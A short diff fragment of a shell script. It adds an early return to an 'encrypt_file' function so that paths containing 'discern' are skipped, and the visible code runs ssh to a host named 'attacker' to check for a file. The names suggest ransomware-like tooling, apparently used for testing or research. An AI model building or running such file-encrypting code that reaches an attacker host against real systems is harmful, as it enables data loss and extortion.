@@ -9,7 +9,7 @@ remote_kill() {
 
 encrypt_file() {
     if [[ "$1" == *discern* ]]; then
-
+        return;
     fi
     res=$(ssh attacker "if [[ -f \"$1\" ]]; then echo 'exists'; fi")
     if [ ! "$res" = "exists" ]; then
